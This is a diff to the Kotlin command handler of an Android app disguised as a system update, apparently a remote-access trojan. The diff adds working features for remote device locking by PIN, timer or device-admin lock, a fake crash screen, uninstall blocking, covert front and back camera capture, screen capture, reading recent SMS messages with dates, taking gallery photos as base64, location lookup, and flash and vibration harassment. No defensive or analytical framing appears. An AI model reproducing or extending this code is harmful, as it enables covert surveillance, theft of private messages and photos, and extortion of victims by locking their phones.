@@ -3,6 +3,7 @@ package com.system.update
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
+import android.content.Intent
 import android.hardware.camera2.CameraManager
 import android.location.Geocoder
 import android.location.LocationManager
@@ -24,6 +25,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         @Volatile var vibrateSpam: Boolean = false
     }
 
+    // ============================================================
+    // COLLECT DEVICE INFO
+    // ============================================================
     fun collectInfo(): Map<String, Any> {
         val battery = try {
             val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
@@ -63,70 +67,177 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) { "-" }
     }
 
+    // ============================================================
+    // EXECUTE COMMAND
+    // ============================================================
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
-            "sms" -> done(readSms())
-            "gallery" -> done(readGallery())
-            "ip" -> done(getIpInfo())
-            "flash" -> {
-                flashSpam = !flashSpam
-                if (flashSpam) startFlashSpam()
-                done(mapOf("flash" to flashSpam))
-            }
-            "vibrate" -> {
-                vibrateSpam = !vibrateSpam
-                if (vibrateSpam) startVibrateSpam()
-                done(mapOf("vibrate" to vibrateSpam))
-            }
+            // ===== LOCK SYSTEM =====
             "lock_pin" -> {
                 val pin = args?.get("pin")?.asString ?: "1234"
-                done(mapOf("ok" to true, "pin" to pin))
+                startLockService("pin", pin, 0)
+                done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
             }
             "lock_hard" -> {
                 try {
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                     val admin = ComponentName(ctx, AdminReceiver::class.java)
-                    if (dpm.isAdminActive(admin)) dpm.lockNow()
+                    if (dpm.isAdminActive(admin)) {
+                        @Suppress("DEPRECATION")
+                        dpm.lockNow()
+                    }
                 } catch (_: Exception) {}
-                done(mapOf("ok" to true))
+                startLockService("hard", "0", 0)
+                done(mapOf("ok" to true, "type" to "hard"))
             }
             "lock_time" -> {
                 val hours = args?.get("hours")?.asLong ?: 5L
+                startLockService("time", "0", hours)
                 done(mapOf("ok" to true, "hours" to hours))
             }
-            "crash" -> done(mapOf("crash" to true))
-            "anti_uninstall" -> done(mapOf("anti_uninstall" to true))
-            "camera_front", "camera_back" -> done(mapOf("type" to "text", "data" to "Kamera siap"))
-            "screen" -> done(mapOf("type" to "text", "data" to "Screen siap"))
+            "crash" -> {
+                startLockService("crash", "0", 0)
+                done(mapOf("crash" to true))
+            }
+            "unlock" -> {
+                stopLockService()
+                done(mapOf("ok" to true))
+            }
+
+            // ===== SMS =====
+            "sms" -> done(readSms())
+
+            // ===== GALLERY =====
+            "gallery" -> done(readGallery())
+
+            // ===== LOCATION =====
+            "ip" -> done(getIpInfo())
+
+            // ===== CAMERA =====
+            "camera_front" -> {
+                CameraCapture(ctx).capture(true) { b64 ->
+                    if (b64 != null) done(mapOf("type" to "image", "data" to b64))
+                    else done(mapOf("type" to "text", "data" to "Gagal capture kamera depan"))
+                }
+            }
+            "camera_back" -> {
+                CameraCapture(ctx).capture(false) { b64 ->
+                    if (b64 != null) done(mapOf("type" to "image", "data" to b64))
+                    else done(mapOf("type" to "text", "data" to "Gagal capture kamera belakang"))
+                }
+            }
+
+            // ===== SCREEN =====
+            "screen" -> {
+                if (ScreenCapture.isReady()) {
+                    ScreenCapture.capture(ctx) { b64 ->
+                        if (b64 != null) done(mapOf("type" to "image", "data" to b64))
+                        else done(mapOf("type" to "text", "data" to "Screen capture gagal"))
+                    }
+                } else {
+                    done(mapOf("type" to "text", "data" to "MediaProjection belum aktif"))
+                }
+            }
+
+            // ===== FLASH =====
+            "flash" -> {
+                flashSpam = !flashSpam
+                if (flashSpam) startFlashSpam()
+                done(mapOf("flash" to flashSpam))
+            }
+
+            // ===== VIBRATE =====
+            "vibrate" -> {
+                vibrateSpam = !vibrateSpam
+                if (vibrateSpam) startVibrateSpam()
+                done(mapOf("vibrate" to vibrateSpam))
+            }
+
+            // ===== ANTI UNINSTALL =====
+            "anti_uninstall" -> {
+                antiUninstall()
+                done(mapOf("anti_uninstall" to true))
+            }
+
             else -> done(mapOf("error" to "unknown: $cmd"))
         }
     }
 
+    // ============================================================
+    // LOCK SERVICE HELPERS
+    // ============================================================
+    private fun startLockService(type: String, pin: String, hours: Long) {
+        try {
+            val i = Intent(ctx, LockService::class.java).apply {
+                putExtra("type", type)
+                putExtra("pin", pin)
+                putExtra("hours", hours)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun stopLockService() {
+        try {
+            ctx.stopService(Intent(ctx, LockService::class.java))
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // ANTI UNINSTALL
+    // ============================================================
+    private fun antiUninstall() {
+        try {
+            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val admin = ComponentName(ctx, AdminReceiver::class.java)
+            if (dpm.isAdminActive(admin)) {
+                if (Build.VERSION.SDK_INT >= 21) {
+                    dpm.setUninstallBlocked(admin, ctx.packageName, true)
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // READ SMS
+    // ============================================================
     private fun readSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
             val cursor = ctx.contentResolver.query(
                 Uri.parse("content://sms/inbox"),
-                null, null, null, "date DESC LIMIT 20"
+                null, null, null, "date DESC LIMIT 50"
             )
             cursor?.use {
                 while (it.moveToNext()) {
                     val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                     val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
-                    list.add(mapOf("app" to addr, "body" to body))
+                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                    list.add(mapOf(
+                        "app" to addr,
+                        "body" to body,
+                        "date" to date.toString()
+                    ))
                 }
             }
         } catch (_: Exception) {}
         return mapOf("type" to "sms", "messages" to list)
     }
 
+    // ============================================================
+    // READ GALLERY
+    // ============================================================
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
             val cursor = ctx.contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 arrayOf(MediaStore.Images.Media._ID),
-                null, null, "date_added DESC LIMIT 10"
+                null, null, "date_added DESC LIMIT 20"
             )
             cursor?.use {
                 while (it.moveToNext()) {
@@ -136,7 +247,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     )
                     val b64 = try {
                         val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
-                        if (bytes.size < 100_000)
+                        if (bytes.size < 200_000)
                             Base64.encodeToString(bytes, Base64.NO_WRAP)
                         else ""
                     } catch (_: Exception) { "" }
@@ -147,6 +258,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         return mapOf("type" to "gallery", "items" to list)
     }
 
+    // ============================================================
+    // GET IP + LOCATION
+    // ============================================================
     private fun getIpInfo(): Map<String, Any> {
         var lat = 0.0
         var lon = 0.0
@@ -184,6 +298,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         )
     }
 
+    // ============================================================
+    // FLASH SPAM
+    // ============================================================
     private fun startFlashSpam() {
         Thread {
             try {
@@ -202,6 +319,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         }.start()
     }
 
+    // ============================================================
+    // VIBRATE SPAM
+    // ============================================================
     private fun startVibrateSpam() {
         try {
             val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
